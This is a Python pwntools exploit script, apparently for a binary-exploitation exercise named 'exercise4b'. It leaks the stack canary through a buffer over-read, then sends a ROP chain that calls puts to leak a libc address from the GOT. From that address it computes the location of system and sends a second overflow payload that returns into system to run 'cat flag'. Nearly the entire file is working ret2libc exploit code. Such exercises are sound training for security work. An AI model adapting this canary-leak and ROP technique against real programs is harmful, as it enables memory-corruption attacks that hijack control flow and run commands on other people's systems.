#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise4b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# r = start()
# r.send(b'imposter\0\x0a')
# print(r.recvuntil(b'Enter the secret password:\n'))

# r.send(b'TEST\0\x0a')
# print(r.recv())

e = ELF(exe)
libc_e = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')
ropp = ROP(e)

puts_libc_addr_plt = e.plt['puts']
puts_libc_addr_got = e.got['puts']
puts_libc_addr_offset = libc_e.symbols['puts']
system_libc_addr_offset = libc_e.symbols['system']

main_addr = e.symbols['main']

print(f'Puts plt: {hex(puts_libc_addr_plt)}')
print(f'Puts got {hex(puts_libc_addr_got)}')
print(f'Main: {hex(main_addr)}')
print(f'Puts offset: {hex(puts_libc_addr_offset)}')
print(f'System offset: {hex(system_libc_addr_offset)}')

g_pop_rdi = ropp.find_gadget(['pop rdi', 'ret'])[0]
g_ret = 0x401343

print(f'Gadget pop edi GOT: {hex(g_pop_rdi)}')
print(f'Gadget ret: {hex(g_ret)}')


r = start()
# SYSTEM_ADDR = r.libc.symbols['system']
LOAD_NAME_TO_RDI_ADDRESS = 0x40130C

r.sendline(b'cat flag\0')

r.recvuntil(b'Enter the secret password:\n')

BUF_SIZE = 20
leak = cyclic(BUF_SIZE - 1) + b'\x0a'
r.send(leak)

r.recvline_contains(cyclic(8))
canary_raw = r.recvline().split(b' is ')[0]
canary = int.from_bytes(canary_raw, byteorder='little')

print(canary_raw)

r.recvuntil(b'Enter the secret password:\n')

leak_payload = cyclic(BUF_SIZE)
leak_payload += pack(canary, 64)
leak_payload += cyclic(12)
leak_payload += pack(g_pop_rdi, 64)
leak_payload += pack(puts_libc_addr_got, 64)
leak_payload += pack(puts_libc_addr_plt, 64)
leak_payload += pack(main_addr, 64)
leak_payload += b'\x0a'
print((len(leak_payload) - 1) % 16)

r.send(leak_payload)

r.recvuntil(b'is not the password\n')

MAIN_RESTART_INDICATOR = b'\nHi,'
leaked = r.recvuntil(MAIN_RESTART_INDICATOR)[:-len(MAIN_RESTART_INDICATOR)]
real_puts_got = int.from_bytes(leaked[:8], byteorder='little')
print(f'Real Puts GOT: {hex(real_puts_got)}')

libc_base_addr = real_puts_got - puts_libc_addr_offset

system_addr = libc_base_addr + system_libc_addr_offset

print(f'Real system: {hex(system_addr)}')
r.sendline(b'cat flag\0')

r.recvuntil(b'Enter the secret password:\n')

# Realeak canary, as we have reentered main and new one can be generated
r.send(leak)

r.recvline_contains(cyclic(8))
canary_raw = r.recvline().split(b' is ')[0]
canary = int.from_bytes(canary_raw, byteorder='little')

print(canary_raw)

payload = cyclic(BUF_SIZE)
payload += pack(canary, 64)
payload += cyclic(12)
payload += pack(g_ret, 64)
payload += pack(system_addr, 64)
payload += b'\x0a'

r.send(payload)

pause(1)

a = r.recvall(timeout=3)
print(a)
